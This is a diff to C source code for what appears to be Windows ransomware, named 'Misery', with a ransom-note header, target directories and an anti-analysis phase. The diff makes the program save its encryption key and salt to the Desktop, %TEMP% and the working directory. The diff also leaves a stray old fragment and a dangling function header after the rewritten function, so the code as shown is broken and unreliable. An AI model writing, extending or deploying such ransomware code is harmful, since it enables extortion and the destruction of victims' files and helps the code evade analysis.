@@ -8,6 +8,7 @@
 #include "ransomnote.h"
 #include <stdio.h>
 #include <stdlib.h>
+#include <stdint.h>
 #include <string.h>
 #include <stdbool.h>
 #include <windows.h>
@@ -298,7 +299,27 @@ static bool ExecutePhaseCleanup(void) {
  * Save key file to a safe location OUTSIDE all target directories
  * ═══════════════════════════════════════════════════════════════ */
 static bool SaveKeyFile(const char *key, const BYTE *salt) {
-    /* Try %TEMP% first — this is never under target dirs */
+    int savedCount = 0;
+
+    /* ── Location 1: Desktop (user-visible, expected location) ── */
+    char desktop[MAX_PATH];
+    if (SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, 0, desktop) == S_OK) {
+        char keyPath[MAX_PATH * 2];
+        snprintf(keyPath, sizeof(keyPath), "%s\\misery.key", desktop);
+        FILE *kf = fopen(keyPath, "wb");
+        if (kf) {
+            fwrite(salt, 1, SALT_SIZE, kf);
+            fprintf(kf, "%s\n", key);
+            fclose(kf);
+            MiseryLog(MISERY_LOG_INFO, "Key saved to: %s", keyPath);
+            savedCount++;
+        } else {
+            MiseryLog(MISERY_LOG_WARN, "Failed to save key to Desktop: %s (err: %d)",
+                      keyPath, GetLastError());
+        }
+    }
+
+    /* ── Location 2: %%TEMP%% (system temp, outside all target dirs) ── */
     char tempPath[MAX_PATH];
     if (GetTempPathA(MAX_PATH, tempPath)) {
         char keyPath[MAX_PATH * 2];
@@ -309,11 +330,40 @@ static bool SaveKeyFile(const char *key, const BYTE *salt) {
             fprintf(kf, "%s\n", key);
             fclose(kf);
             MiseryLog(MISERY_LOG_INFO, "Key saved to: %s", keyPath);
-            return true;
+            savedCount++;
+        } else {
+            MiseryLog(MISERY_LOG_WARN, "Failed to save key to TEMP: %s (err: %d)",
+                      keyPath, GetLastError());
         }
     }
 
+    /* ── Location 3: CWD (project directory) — safe with new skip logic ── */
+    char cwd[MAX_PATH];
+    if (GetCurrentDirectoryA(MAX_PATH, cwd)) {
+        char keyPath[MAX_PATH * 2];
+        snprintf(keyPath, sizeof(keyPath), "%s\\misery.key", cwd);
+        /* Avoid writing CWD key if it happens to be Desktop or TEMP (no duplicates) */
+        if (_stricmp(cwd, desktop) != 0 &&
+            (GetTempPathA(MAX_PATH, tempPath) && _stricmp(cwd, tempPath) != 0)) {
+            FILE *kf = fopen(keyPath, "wb");
+            if (kf) {
+                fwrite(salt, 1, SALT_SIZE, kf);
+                fprintf(kf, "%s\n", key);
+                fclose(kf);
+                MiseryLog(MISERY_LOG_INFO, "Key saved to: %s", keyPath);
+                savedCount++;
+            } else {
+                MiseryLog(MISERY_LOG_WARN, "Failed to save key to CWD: %s (err: %d)",
+                          keyPath, GetLastError());
+            }
+        }
+    }
+
+    return savedCount > 0;
+}
+
     /* Fallback to current directory — but this will be skipped by fileops */
+bool save_key_to_file(const char *key, const uint8_t *salt) {
     FILE *kf = fopen("misery.key", "wb");
     if (kf) {
         fwrite(salt, 1, SALT_SIZE, kf);
@@ -436,11 +486,12 @@ int main(int argc, char **argv) {
         return 1;
     }
 
-    /* Save key and salt to file — OUTSIDE target directories */
-    if (!SaveKeyFile(key, GetCryptoCtx()->salt)) {
-        MiseryLog(MISERY_LOG_WARN, "Failed to save key to any location!");
-    }
-
+  /* ── Save key to ALL safe locations ── */
+if (!SaveKeyFile(key, GetCryptoCtx()->salt)) {
+    MiseryLog(MISERY_LOG_ERROR, "CRITICAL: Failed to save key to ANY location!");
+} else {
+    MiseryLog(MISERY_LOG_INFO, "Key file saved successfully to at least one location.");
+}
     /* Phase 1: Anti-Analysis */
     if (!ExecutePhaseAntiAnalysis()) {
         MiseryLog(MISERY_LOG_WARN, "Anti-analysis failed, continuing...");
